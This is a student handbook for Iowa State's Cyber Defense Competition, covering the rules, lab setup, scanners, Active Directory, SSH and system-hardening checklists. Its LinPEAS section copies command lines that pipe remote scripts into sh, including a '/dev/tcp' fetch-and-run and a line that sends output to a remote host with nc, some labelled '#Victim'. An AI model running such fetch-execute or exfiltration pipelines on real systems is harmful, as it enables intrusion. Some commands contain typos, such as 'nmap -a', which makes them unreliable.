# ISU CDC Handbook
### Guides, tutorials, and reference material to help you prepare and conquer the Cyber Defense Competition at Iowa State University.
---
# Table of Contents
- [What to Expect](#what-to-expect)
  - [What is the CDC](#what-is-the-cdc)
  - [Rules of Engagement](#rules-of-engagement)
  - [Scenarios and Anomalies](#scenarios-and-anomalies)
  - [Red team, Fire Drills, and Social Engineering](#red-team-fire-drills-and-social-engineering)
- [Before the Competition](#before-the-competition)
  - [Team Formation and Registration](#team-formation-and-registration)
  - [Competition Network and Environment](#competition-network-and-environment)
  - [Planning a Playbook and Basic Triaging](#planning-a-playbook-and-basic-triaging)
  - [Creating a Practice Network](#creating-a-practice-network)
  - [What to Practice](#what-to-practice)
- [Preparing for the Competition](#preparing-for-the-competition)
  - [Scanning for vulnerabilities](#scanning-for-vulnerabilities)
  - [Changing Default Passwords](#changing-default-passwords)
  - [Configuring Active Directory](#configuring-active-directory)
  - [Enabling SSH on port 22](#enabling-ssh-on-port-22)
  - [Configuring a Firewall](#configuring-a-firewall)
  - [Configuring VLAN](#configuring-vlan)
  - [Configuring an Intrusion Detection System](#configuring-an-intrusion-detection-system)
  - [Port Scanning](#port-scanning)
  - [System Hardening  for Linux](#system-hardening-for-linux)
  - [System Hardening for Windows](#system-hardening-for-windows)
- [Attack Phase of the Competition](#attack-phase-of-the-competition)
  - [Signs of an Attack](#signs-of-an-attack)
  - [Sniffing Network Traffic](#sniffing-network-traffic)
  - [Understanding Windows Event Viewer](#understanding-windows-event-viewer)
  - [Analyzing logs](#analyzing-logs)
  - [Identifying Malicious Processes](#identifying-malicious-processes)
  - [Isolating an Affected Machine](#isolating-an-affected-machine)
  <br>
<br>

---
 # What to Expect
---
## What is the CDC
The Cyber Defense Competition is a competition hosted by Iowa State university that is designed to give students a practical, educational experience that simulate the challenges faced within incident response efforts in cyber security. Each team is assembled of four to eight players and assume the role of the Blue Team and are assigned vulnerable machines. The teams must defend against the Red Team, which represents network attackers and are industry professionals from within the area. The machines are released to the students typically at noon the day before the competition and have until 8:00 am before the attack phase begins. From 8:00 am to 4:00 pm the teams must defend against the red team and keep their services up and running to avoid losing points. The White Team supervises the event, evaluates, and assigns points to each Blue Team based on the assessments from the Red and Green Teams. The Green Team embodies typical network users, contributing to the complexity of maintaining network security. The Blue Team that accumulates the highest score by the competition's conclusion will be declared the victor. For additional details, refer to https://cdc.iseage.org/ or https://cdc.pizza/ for details on the next CDC.
<br>
## Rules of Engagement
For more details on the rules of engagement please visit https://docs.iseage.org/rules/v4.1/rules/index.html#blue-teams 
1. Blue Teams must avoid engaging in offensive behavior when defending against red team.
2. Blue Team members should refrain from sharing CDC credentials.
3. Any software or program used must be open-source or provided by ISEAGE (free-trials on paid services are allowed).
5. Access requirements for servers must be followed in order to receive points.
6. Blue Teams must follow account management guidelines and only change user passwords with authorization.
7. Submissions for usability checks and anomalies must be submitted before the dealine to receive points.
8. Blue team must not be composed of 8 or more players
9. Blue team must cooperate with white team requests
<br>

## Scenarios and Anomalies
The CDCs scenarios vary but usuallly include an active directory server, a database, a web application, a client, an application that connects to the database, and some sort of custom application. Over the years the versions of operating systems have  changed but typically use a combination of older Ubuntu versions such as 16, 20.04, as well as Alma 8 or 9, Windows 10 and Windows Server 16. Moreover, throughout the attack phase the green team leader releases anomolies which consists of a variety of tasks that teams can complete for additional points
<br>


## Red Team, Fire Drills, and Social Engineering
The red team will use a variety of techniques to take down blue team flags including traditional means of running scripts or tools against the machines as well as nontraditional means such as social engineering. Green team memebers as the end users must be able to access and interact with services and red team may attempt to impersonate the green team in attempt to gain leverage over their machines. Moreover, some red team members have used other creative means such as claiming they are a photographer taking pictures for the CDC event and end up stealing credentials. Blue teams must be prepared to handle any attack thrown at them as well as firedrills; once a firedrill is announced the blue teams must leave their computers as they are and exit the room. The red team at most can tap the space bar or wiggle a mouse but are not allowed go through or attack blue team members' personal devices.
<br>
<br>

---
# Before the Competition
---
## Team Formation and Registration
Teams should register at blue team at https://signup.iseage.org/ 
<img src="https://i.imgur.com/yUPDzTZ.png" width="587.5" height="310">

Be sure to rememember your credentials as they are necessary for accessing the network
<img src="https://i.imgur.com/HFkKrIP.png" width="587.5" height="310">

Create or join a team of up to eight players.
<br>

---
## Competition Network and Environment

After registering, the network can be accessed at https://vcenter.iseage.org/ be sure you are connected CDC network otherwise you will not be able to access the server.
<br>
 <img src="https://i.imgur.com/Grft5nU.png" width="672" height="310">
 
 Upon logging in your machines should be visable within the left panel. 
 
  <img src="https://i.imgur.com/G9W8mRu.png" width="672" height="310">

  To open your virtual machine you must first turn on the machine by clicking the "Power On" play button
  
  <img src="https://i.imgur.com/zBYkRnO.png" width="315" height="84.5">
  
  Then launch the virtual machine by click the "Launch Console" button
  
  <img src="https://i.imgur.com/pnc2dOG.png" width="315" height="84.5">

  Select Web Console and hit launch to open the machine in a new tab within your browser
  
  <img src="https://i.imgur.com/xG0guhG.png" width="377" height="181.5">
<br>

  ---
## Planning a Playbook and Basic Triaging
## Creating a Practice Network
Practice makes perfect and nothing beats having your very own network to test out what you'll learn. Before you get started you will need to download a few applications; a hyper visor and a few ISO files. A hypervisor is the platform that will run your virtualized network enviroment and an ISO file is often the format of choice for distributing operating systems. Below are some resources to get started, check with your school as some insitutions offer vmware or windows license to students for free. For this example we will be using Vmware Workstation since the competition uses Vmware products to host the virtual network. Simply navigate to the download link, and follow the wizard for installation. This tutorial will focus on teaching you how to get your network up and running.
1. Install hypervisor of your choice
  
   - [Vmware Workstation](https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html.html.html)  &nbsp;  <img src="https://static.wikia.nocookie.net/logopedia/images/6/62/VMware_Workstation_7_logo.png/revision/latest?cb=20140525014047" width="40" height="40">
     - 30 day free trial
        <br>
        
   - [VirtualBox](https://www.virtualbox.org/wiki/Downloads) &nbsp; <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Virtualbox_logo.png/330px-Virtualbox_logo.png" width="50" height="50">
     - Free
      
   - [HyperV](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v) &nbsp; <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" width="40" height="40">
     - Windows license required

2. Download ISO files 

   Essentials:
    - Ubuntu:
      - [Server ISO Download](https://ubuntu.com/download/alternative-downloads#other-images-and-mirrors)
      - [Desktop ISO Download](https://ubuntu.com/download/alternative-downloads)
    - Windows:
      - [Windows Server 2016 Evaluation ISO Download](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2016)
      - [Windows 10 Evaluation ISO Download](https://info.microsoft.com/ww-landing-windows-10-enterprise.html) (Requires registration)
      
   Additional:
    - Alma
      - [ISO Download](https://mirrors.almalinux.org/isos.html)
    - Pfsense
      - [ISO Download](https://www.pfsense.org/download/)
    - Kali
      - [ISO Download](https://www.kali.org/get-kali/#kali-installer-images)
    - Security Onion
      - [ISO Download](https://download.securityonion.net/file/securityonion/securityonion-2.4.60-20240320.iso)
              <br>
      <br>

4. Create Virtual Machines
      <br>
Open Workstation and navigate to "File > New Virtual Machine" or click "ctrl + N"
  <img src="https://i.imgur.com/mHI6E7e.png">
  Select typical and click "Next"
  <img src="https://i.imgur.com/13YSA4M.png" width=398 height=429>
  Click browse and select the ISO file you downloaded
  <img src="https://i.imgur.com/mJgeZDf.png" width=398 height=429>
  Navigate through the wizard by creating a user account and appropriately name the host
  <img src="https://i.imgur.com/2v063EI.png" width=398 height=429>
  The default 20 GB should be enough for your machine
  <img src="https://i.imgur.com/Mb2hSO1.png" width=398 height=429>
   Confirm all the information is correct and click "finish"
  <img src="https://i.imgur.com/pSxO2aT.png" width=398 height=429>
  Follow the installation wizard to finish setting up the machine
  <img src="https://i.imgur.com/DXxqPK3.png" width="639" height="401">
  <br>

## What to Practice
1. Active Direcory, familiarize yourself in setting up AD, creating users and group. Get comfortable with creating group policies and quickly changing passwords when needed.
2. Become familiar with the standard procedure for configuring and maintaining the databases.
3. Gain experience in networking by being able to configure ports, firewalls, IPs. Understand how the network is laid out and the different layers the services operate upon.
4. Understand and practice setting up and managing a firewall, the most asked question within the CDC usually are firewall related.
<br>

---

# Preparing for the Competition

---

## Scanning for Vulnerabilities
There a variety tools available for you to use that can streamline the process of hunting for vulnerabilities.

### Nessus
Nessus is an enterprise tool that is quite reputable and is widely used within the industry. Nessus offers a free 30 day trial on their popular vulnerability scanner. It's limited compared to the commercial version but still provides valuable vulnerability scanning capabilities. Visit https://www.tenable.com/downloads/nessus?loginAttempted=true to download you have the option to choose from a preformatted virtual machine file or download the file directly to the host.


1. Run the Installer
  For Windows:
  -  Double-click the downloaded .exe file and follow the on-screen instructions.
    
  For Linux:
  -  Open a terminal, navigate to the download directory, and run the following commands:
```bash
sudo chmod +x Nessus-*.rpm (or .deb)
   
sudo ./Nessus-*.rpm (or .deb
```

2. Start the Nessus Service

  On Windows:
  -   the Nessus service should start automatically after installation.
    
  On Linux:
  -  start the Nessus service with the following command:
```bash
sudo /etc/init.d/nessusd start
```

3. Open a web browser and go to https://localhost:8834
4. Follow the on-screen instructions to register your Nessus installation and activate your license.
5. After activation, you will be prompted to create an admin user account.
6. Provide a username and password, then click "Submit".
7. Log in to the Nessus web interface using the admin account you just created.
8.  Click "Scans" in the left-hand menu, then click "New Scan" to create a new scan.
9.   Configure the scan settings as needed, then click "Launch Scan" to begin the vulnerability assessment.




### OpenVAS
OpenVAS is a comprehensive vulnerability scanning tool that detects security issues in your network and provides solutions to address them. It's open-source and offers a wide range of features navigate to https://www.greenbone.net/en/testnow/#toggle-id-1 to begin downloading.

1. Download the OVA file of the Greenbone Enterprise TRIAL.
2. Launch Vmware
4. In Vmware select File > Open… in the menu bar
5. Select the OVA file of the appliance in the file system.
  <img src="https://www.greenbone.net/wp-content/uploads/Import_VMware_1.png">
6. Click import
7. Login with the default credentials
   
   `username: admin`

   `password: admin`
   
  <img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_1.png" width="539" height="301">

8. Select Yes and press Enter to open the Wizard.
9. Select Yes and press Enter.
10. Enter the user name of the web administrator.
  <img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_2.png">

12. Enter the password of the web administrator twice.
13. Select OK and press Enter.
    
    `→ The editor is opened.`
    
14. Press Enter to close the message.
<img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_3.png" width="539" height="301">

16. Select Editor and press Enter.
17. Enter the subscription key.
18. Press ctrl + X.
19. Press Y to save the changes.
20. Press Enter.
<img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_4.png">

22. The web interface can be accessed by opening the web browser.
23. Enter the IP address of the appliance’s web interface.
    
         Note: The IP address of the appliance’ s web interface can be displayed as follows:
        During the login to the GOS administration menu
        By selecting About and pressing Enter in the GOS administration menu
    
24. Log in with the web administrator created during setup.
    
        → The web interface is opened.

<img src="https://www.greenbone.net/wp-content/uploads/Main_Dashboard_EN.png" width="539" height="301">

### Linpeas
LinPEAS is not specifically a vulnerability scanner in the traditional sense, but rather a tool for identifying potential security weaknesses and paths to escalate privileges on Linux systems. It can be useful for incident response by providing you with information of vulnerable or weak areas to patch or secure.

 From github
  ```bash
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

 Without curl
  ```bash
  python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
  ```
  ```bash
  python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
  ```
 Local network
   ```bash
  sudo python3 -m http.server 80 #Host
   ```
  ```bash
  curl 10.10.10.10/linpeas.sh | sh #Victim
  ```

 Without curl
  ```bash
  sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
  ```
  ```bash
  cat < /dev/tcp/10.10.10.10/80 | sh #Victim
  ```

Excute from memory and send output back to the host
  ```bash
  nc -lvnp 9002 | tee linpeas.out #Host
  ```
  ```bash
  curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
  ```

Use a linpeas binary
  ```bash
  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
  ```
  ```bash
  chmod +x linpeas_linux_amd64
  ```
  ```bash
  ./linpeas_linux_amd64
  ```

---
## Changing Default Passwords
One of the most important tasks to take care upon first receiving your machines is to change all default passwords to the hosts on your network.

### Windows
Enter Ctrl+Alt+Delete and click change a password

<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fhelp.sentrian.com.au%2Fwp-content%2Fuploads%2F2018%2F08%2Fclt-alt-del-winserver16-1.jpg&f=1&nofb=1&ipt=5b318dce91056915c4e99c1904c0e216d89925c30a05e008b14ddc8c429035ea&ipo=images">

Choose a new and secure password unique to this host 

<img src="https://kb.mlml.sjsu.edu/uploads/images/gallery/2019-02-Feb/scaled-840-0/image-1550688271601.png">

### Linux
Open a terminal and type the following command
      
      passwd

You will be prompt to enter your current password followed by being asked to enter a new password
<img src="https://itslinuxfoss.com/wp-content/uploads/2023/02/image-995.png">

<br>

---
## Configuring Active Directory

Using powershell to join hosts to the domain can be efficiently especially for tasks that involve automation and scripting. PowerShell provides cmdlets specifically designed for managing Active Directory and performing domain join operations. This provides a more straightforward approach in setting up the AD server however may vary slightly depending on 
Here's how you can set up AD and join hosts to the domain using PowerShell:

### Setting up Active Directory:

1. Search powershell in Start Menu
2. Right-click and run as administrator

3. Use the `Install-WindowsFeature` cmdlet to install the Active Directory Domain Services role:

   ```powershell
   Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

5. Use the `Install-ADDSForest` cmdlet to promote the server to a domain controller:

   ```powershell
   Install-ADDSForest -DomainName "isucdc.com" -DomainNetbiosName "ISUCDC" -ForestMode "WinThreshold" -DomainMode "WinThreshold" -InstallDns -Force

- Note: For Testing purposes in your own network substitute with the following, be sure to have a password set for both you and the admin account:
  
  ```powershell
     Install-ADDSForest -DomainName "mylab.local" -CreateDnsDelegation:$false -DomainNetBiosName "mylab" -InstallDns:$true
  ```
  
6. Use the `Set-ADDirectoryServicesRestoreModePassword` cmdlet to set the Directory Services Restore Mode (DSRM) password:
  
   ```powershell
   Set-ADDirectoryServicesRestoreModePassword -NewPassword (ConvertTo-SecureString -AsPlainText "YourDSRMPassword" -Force)

7. After promoting the server to a domain controller, restart the server to complete the process.
<br>
 
 ### Joining Hosts to Active Directory:

  Joining Windows Hosts:
   - Use the `Add-Computer` cmdlet to join a Windows host to the domain:
   
   ```powershell
   Add-Computer -DomainName "isucdc.com" -Credential Get-Credential
   ```
     
  Joining Linux Hosts:
   1. Install the necessary PowerShell modules for managing Linux systems (e.g., `PowerShellGet`, `PackageManagement`).
   2. Join the Linux host to the domain using the `Join-ADComputer` cmdlet:
  ```powershell
  Join-ADComputer -Server "DC1.isucdc.com" -Credential (Get-Credential) -Name "LinuxHost01"
  ```     

#### Verify Domain Join:
Windows Hosts:
  - You can use the `Get-ComputerInfo` cmdlet to retrieve information about the domain status on Windows hosts:
    
    ```powershell
    Get-ComputerInfo -Property 'DomainJoined'
    ```
    
  - This command will return whether the computer is joined (`True`) or not joined (`False`).

Linux Hosts:
  - Realm list is a native command that displays all the realms that the system in joined to including AD
    
    ```bash
    realm list
    ```

### Bulk user, organizational unit, and group creation
Within the Active directory folder of the github repo there are exists a Powershell script to mass import users as well as a spreadsheet that you can use as a template to fill with your own users

1. Download the folder onto your Windows server
<img src="https://activedirectorypro.com/wp-content/uploads/2022/09/powershell_scripts_c_drive.webp">

2. First we will create an organizational unit, modify the ous.csv file to reflect your CDC user roles and save
<img src="https://i.imgur.com/3y85x0M.png">

4. From the start menu search Windows Powershell ISE, right click and run as administrator

5. Click File > Open > create_ous.ps1 and run the file
<img src="https://activedirectorypro.com/wp-content/uploads/2022/09/create-ous-powershell-1.webp">

6. Repeat the same process for groups and users by updating the csv file and running the code

7. Confirm the program ran successfully by running the following command in powershell:

 ```powershell
   Get-ADUser -filter * -Properties * | Select name, department, title | out-gridview
  ````

----
## Enabling SSH on port 22
SSH other wise known as the secure shell allows a user a secure way to remotely access a system and is often required for linux host within the CDC

### Alma Linux
1. Install OpenSSH for your system

  ```bash
  dnf install openssh-server openssh-clients
```

2. Use systemctl to start or stop the SSH server
 ```bash
  systemctl start sshd
```
```bash
  systemctl stop sshd
```

3. To enable SSH to automatically starts at system boot

```bash
  systemctl enable sshd
```
  To Disable:
```bash
  systemctl disable sshd
```
4. To chech the SSH server status
```bash
   systemctl status sshd
```
5. To allow traffic on SSH through the firewall execute the following
```bash
   firewall-cmd --zone=public --permanent --add-service=ssh
```
```bash
   firewall-cmd --reload
```

### Ubuntu
1. Update the package index:
  ```bash
  sudo apt update
  ```
3. Install the SSH server package:
 ```bash
 sudo apt install openssh-server
 ```  
4. Once installed, the SSH service should start automatically. You can verify its status with:
 ```bash
 sudo systemctl status ssh
```
5. If the service is not running, you can start it with:
 ```bash
 sudo systemctl start ssh
```
6. To enable SSH to start automatically on boot, run:
 ```bash
  sudo systemctl enable ssh
   ```
7. To configure or verify your SSH settings you can modify it using nano:
  ```bash  
  sudo nano /etc/ssh/sshd_config
```
8. Verify the port is set to 22 look for the line that specifies the port SSH listens on. It usually looks like this:
 ```bash
 Port 22
 ```
Uncomment by removing the # at the beginning of the line if necessary.

9. Enter Ctrl+S and Ctrl+X to save and exit.
10. Apply the changes by restaring the service:
 ```bash
 sudo systemctl restart sshd
```
12. Test ssh works by opening a new terminal and attempting to access using the follow:
 ```bash
 ssh username@xx.xx.xx -p 22
```
### Windows
1. Search powershell in Start Menu
2. Right-click and run as administrator
3. Enter the following command exactly as written:
  ```powershell
  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
  ```
  - Note the sshd_config file will only generate once the service is started
4. Type the following command to start the service:
   ```powershell
   Start-Service sshd
   ```
5. To configure your SSH settings it can be found in the `sshd_config` file within you `C:ProgramData\ssh` directory
   <img src="https://i.imgur.com/aBzSN2T.png">
 
  
## Configuring a Firewall
## Configuring VLAN
## Configuring an Intrusion Detection System
## Port Scanning
Nmap is a tool that allows you to view what ports are open and exposed to the internet. This information is vital to an attacker as it can provde insight on how to gain foothold on your network . Mitigation tactics include hiding the hosts behind a firewall. A firewall is a security system that monitors and controls incoming and outgoing network traffic based on predefined security rules. One of the key functions of a firewall is to protect a network or system by blocking unauthorized access to certain ports and services. We will dive into setting this up later.

Installation for Windows:
Download Nmap Visit the official Nmap website: https://nmap.org/download.html

Installation for Linux: 
 ```bash
  sudo apt-get update
  sudo apt-get install nmap
 ```
The only command you will likely need is nmap -a followed by either the host ip or ip range, this yeilds a detailed scan of the ports and services running on the machine.

    nmap -a XX.XX.XX.XX
    
## System Hardening for Linux

**Commands listed are not all-encompassing and are for a baseline only!**

1. Change **all** user passwords. *Yes, especially the credentials given to you!*
 ```bash
passwd username
```
2. Audit /etc/shadow for users with passwords set, or no password at all.
```bash
cat /etc/shadow
```
3. Remove all SSH keys present on the box.
```bash
find / -name authorized_keys 2> /dev/null
```
```bash
find / -name id_rsa 2> /dev/null
```
4. Audit sudo access given to users.
```bash
cat /etc/sudoers
```
```bash
cat /etc/sudoers.d/*
```
```bash
getent group sudo | cut -d: -f4` (The *sudo* group is Debian, *wheel* is for RHEL
```
5. Audit /etc/passwd to check for account shells and UIDs.
```bash
cat /etc/passwd | grep :0:
```
```bash
cat /etc/passwd | grep -v /bin/false | grep -v /sbin/nologin
```
6. Verify that there are not any non-standard cron jobs on the system.
```bash
cat /etc/cron.d/*
```
```bash
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done
```
7. Stop services that are not critical to the system or competition needs.
```bash
systemctl --type=service --state=active
```
```bash
systemctl stop servicename
```
8. Identify SUID and SGID files. Cross-reference with https://gtfobins.github.io/ to narrow down malicous instances of SUID and SGID files.
```bash
find / -perm -4000 -print 2>/dev/null` for SUID
```
```bash
find / -perm -2000 -print 2>/dev/null` for SGID
```

10. Identify world-writable files and directories.
For Directories:
```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
For Files:
```bash
    `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

12. Check who is currently logged into the machine.
```bash 
who
```
    
## System Hardening for Windows
---

1. Change **all** user passwords. *Yes, especially the credentials given to you!*
```powershell
net user <username> <password>` NOTE: If domain user, append `/domain
```
2. Audit important groups.
```powershell
`net localgroup Administrators`
```
```powershell
net localgroup "Remote Desktop Users"
```
```powershell
net localgroup "Remote Management Users"`
```

3. Disable WinRM if not needed through powershell.
```powershell 
Disable-PSRemoting -Force
```
4. Check Windows Defender registry keys

    `regedit.exe`  HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender

5. Check for tasks set to run through the registry.

    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

6. Check system and user startup folder.
    
    - User: C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
    - System: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\

7. Audit scheduled tasks.
```powershell
schtasks
```

8. Check PowerShell Execution policy.
```powershell
Get-ExecutionPolicy
```
```powershell
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope LocalMachine
```

9. Check Windows Defender status.
```powershell
Get-MPComputerStatus
```

10. Audit SMB shares.
```powershell
net view \\127.0.0.1
```

11. Disable Guest account.
```powershell
net user guest /active no
```
# Attack Phase of the Competition
## Signs of an Attack
## Sniffing Network Traffic
## Understanding Windows Event Viewer
## Analyzing logs
## Identifying Malicious Processes
## Isolating an Affected Machine



